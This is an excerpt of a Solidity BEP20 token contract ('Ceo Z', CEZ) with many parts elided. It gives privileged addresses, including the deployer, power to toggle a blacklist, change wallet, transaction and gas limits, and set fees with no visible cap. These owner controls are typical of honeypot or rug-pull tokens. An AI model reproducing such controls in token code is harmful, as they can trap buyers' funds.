...
contract CEOZ is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    string constant _name = "Ceo Z";
    string constant _symbol = "CEZ";
    ...
    uint256 public maxGas =  40 * 1 gwei;
    ...
    constructor () {
       router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        ...
        isFeeExempt[msg.sender] = true;isFeeExempt[marketingFeeReceiver] = true;               
        islaunched[msg.sender] = true;isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[marketingFeeReceiver] = true;isTxLimitExempt[pair] = true;
        isTxLimitExempt[address(this)] = true;isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;isDividendExempt[DEAD] = true;
        

        autoLiquidityReceiver = msg.sender; 
        marketingFeeReceiver = 0x6969D42386774D097FdDD43158F312120DBD3820;
    ...
    function SetMaxWalletPercent(uint256 maxWallPercent_base1000) external {
        require(isTxLimitExempt[msg.sender]);
        require(_maxWalletToken >= _totalSupply / 1000);
        _maxWalletToken = (_totalSupply * maxWallPercent_base1000 ) / 1000;
    }

    function SetMaxTxPercent(uint256 maxTXPercentage_base1000) external {
        require(isTxLimitExempt[msg.sender]);
    ...
    function setFeeStructure(uint256 _buy, uint256 _sell, uint256 _trans) external {
        require(isTxLimitExempt[msg.sender]);
    ...
    function setMaxGas (uint256 _maxGas) public {
        require(isTxLimitExempt[msg.sender]);
               maxGas = _maxGas * 1 gwei; 
    
    }

    function enableblacklist(bool _status) public {
        require(isTxLimitExempt[msg.sender]);
    ...
    function setFees(uint256 _liquidityFee, uint256 _rewardFee, uint256 _marketingFee, uint256 _teamFee, uint256 _devFee, uint256 _burnFee, uint256 _feeDenominator) public {
        require(isTxLimitExempt[msg.sender]);
    ...
    function setTarget(uint256 _target, uint256 _denominator) external {
        require(islaunched[msg.sender]);
